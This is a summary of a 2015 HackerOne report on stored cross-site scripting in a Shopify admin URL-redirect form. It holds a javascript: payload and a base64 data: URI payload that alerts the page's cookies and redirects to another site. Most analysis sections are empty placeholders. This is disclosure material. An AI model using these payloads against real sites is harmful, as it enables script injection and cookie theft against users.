# XSS - URL Redirects

## Metadata
- **Source:** HackerOne
- **Report:** 56662 | https://hackerone.com/reports/56662
- **Submitted:** 2015-04-16
- **Reporter:** vlazeg
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** none
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hi!
I found that https://[shop name].myshopify.com/admin/redirects is vulnerable to XSS
To Reproduce:

1. Click Add Url Redirect
2. set page for redirect
3. add redirects as: 
javascript:alert(document.domain)
or data:text/html;base64,PHNjcmlwdD5hbGVydCgiY29va2llIHN0ZWFsOiAiK2RvY3VtZW50LmNvb2tpZSk7d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHA6Ly93d3cuZ29vZ2xlLmNvbSc7PC9zY3JpcHQ+
(XSS and URL redire

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi!
I found that https://[shop name].myshopify.com/admin/redirects is vulnerable to XSS
To Reproduce:

1. Click Add Url Redirect
2. set page for redirect
3. add redirects as: 
javascript:alert(document.domain)
or data:text/html;base64,PHNjcmlwdD5hbGVydCgiY29va2llIHN0ZWFsOiAiK2RvY3VtZW50LmNvb2tpZSk7d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHA6Ly93d3cuZ29vZ2xlLmNvbSc7PC9zY3JpcHQ+
(XSS and URL redirect)
4. A new redirect link created
5. Click on link
6. XSS

Thanks
Fr33d0m from vlazeg team

</details>

---
*Analysed by Claude on 2026-05-24*
